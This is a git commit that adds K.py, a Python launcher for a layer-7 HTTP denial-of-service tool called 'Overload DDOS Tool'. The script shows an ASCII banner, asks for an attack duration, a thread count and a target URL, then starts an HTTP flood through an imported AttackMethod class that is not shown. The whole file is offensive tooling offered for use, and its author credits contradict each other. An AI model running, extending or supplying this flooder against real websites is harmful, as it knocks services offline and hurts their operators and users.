fd183d201d8129a71c081df423523287f0cc6ee2
ptq2k1 <109140826+ptq2k1@users.noreply.github.com>
2022-08-13 09:36:34 +0700

    Add files via upload

--- K.py
+++ K.py
@@ -1,1 +1,53 @@
-# K
+# Created by nuvem and tsk 
+  
+ # Import modules 
+ import os 
+ import sys 
+ import argparse 
+ from colorama import Fore 
+  
+ os.system("@cls & @title Overload DDOS Tool by: 7zx and 8fn & @color e") 
+  
+ # Get the actual directory 
+ os.chdir(os.path.dirname(os.path.realpath(__file__))) 
+  
+ try: 
+     from tools.crash import CriticalError 
+     import tools.addons.clean 
+     import tools.addons.logo 
+     # import tools.addons.winpcap 
+     import tools.addons.wireshark 
+     from tools.method import AttackMethod 
+ except ImportError as err: 
+     CriticalError("Failed to import some packages", err) 
+     sys.exit(1) 
+  
+ method = "HTTP" 
+ logo = """ 
+  ▒█████   ██▒   █▓▓█████  ██▀███   ██▓     ▒█████   ▄▄▄      ▓█████▄  
+ ▒██▒  ██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌ 
+ ▒██░  ██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌ 
+ ▒██   ██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄  ▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌ 
+ ░ ████▓▒░   ▒▀█░  ░▒████▒░██▓ ▒██▒░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓  
+ ░ ▒░▒░▒░    ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒  
+   ░ ▒ ▒░    ░ ░░   ░ ░  ░  ░▒ ░ ▒░░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒  
+ ░ ░ ░ ▒       ░░     ░     ░░   ░   ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░  
+     ░ ░        ░     ░  ░   ░         ░  ░    ░ ░        ░  ░   ░     
+               ░                                               ░      
+ """ 
+ CRED2 = '\33[91m' 
+  
+ if __name__ == "__main__": 
+     # Print help 
+     os.system('cls' if os.name == 'nt' else 'clear') 
+     print(CRED2 + logo + CRED2) 
+     print("├───DDOS TOOL LAYER 7") 
+     time = int(input(f"{Fore.RED}│   ├───TIME:{Fore.RESET}")) 
+     threads = int(input(f"{Fore.RED}│   └───THREADS:{Fore.RESET}")) 
+     target = str(input(f"{Fore.RED}│   └───URL:{Fore.RESET}")) 
+     with AttackMethod( 
+         duration=time, name=method, threads=threads, target=target 
+     ) as Flood: 
+         Flood.Start() 
+ else: 
+     sys.exit(1)
